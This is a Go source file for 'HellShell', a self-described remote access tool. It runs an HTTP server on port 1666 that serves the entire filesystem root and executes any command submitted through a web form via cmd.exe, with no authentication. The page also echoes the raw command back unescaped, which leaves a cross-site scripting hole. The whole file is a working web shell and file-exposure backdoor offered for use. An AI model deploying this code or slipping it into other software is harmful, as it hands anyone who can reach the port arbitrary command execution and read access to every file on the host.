//@(#)Author: Andre Wingor http://andr.ru
//@(#)License: Devil's Contract
/*
HellShell is RA tools
It is simple http server for run remote shell with file transfer option
Run hells and open at browser port 1666:

http://localhost:1666/	File Server
http://localhost:1666/s	Form Shell

UNDER CONSTRUCT

Usage
		hells[.exe] [ip][:port] [path/to/workspace]

*/

package main

import (
	"io"
	"fmt"
	"html"
	"net/http"
	"os/exec"
)
//Data
const Revision = "$Id$" // Revision ID
var (
	echo []byte //Output of command
	err  error  //Error
)
//Conclusion The Contract (HTTP response) 
func contract ( response http.ResponseWriter, request *http.Request) {
	io.WriteString(response, webmuzzle)

	echo, err = exec.Command("cmd", "/C", request.FormValue("cmd")).Output()
	if err != nil {
		fmt.Println(err)
		io.WriteString(response, err.Error())
	}
	io.WriteString(response, html.EscapeString( string(echo)) )

	io.WriteString(response, "</pre><hr>"+request.FormValue("cmd"))
	io.WriteString(response, "</body></html>")
}
//
func init() {
	http.HandleFunc("/s", contract)
	http.Handle("/", http.FileServer(http.Dir("/")))
	http.ListenAndServe(":1666", nil)
}
//------------------------------
//HellShell
func main() {
}
//Web-muzzle
var webmuzzle string = `
<!DOCTYPE html>
<html>
<head><title>Hell$hell</title></head>
<style>
pre {
	font-family: Consolas, Courier New
}
body {
	text-align: left;
	margin-left: 10%;
	font-family: Consolas;
	font-size: 14pt;
}
input {
	font-family: Consolas;
	font-size: 16pt;
}
.cmd {
	width: 70%;
	font-family: Consolas;
	font-size: 14pt;
}
.middle {
	vertical-align: middle;
	height: 7em;
	line-height: 7em;
}
</style>
<body>
<a href="/">localhost:1666/ File Server</a><br/>
<a href="/s">localhost:1666/s Shell</a>
<div class="middle">
	<form id="cmdstr">
cmd.exe&gt;<input class="cmd" type="text" name="cmd" value="" autofocus />
		<input type="submit" value="Enter" /><br/>
	</form>
</div>
<script type="text/javascript">document.cmdstr.cmd.focus();</script>
<hr/>
<pre>
`
//EOF
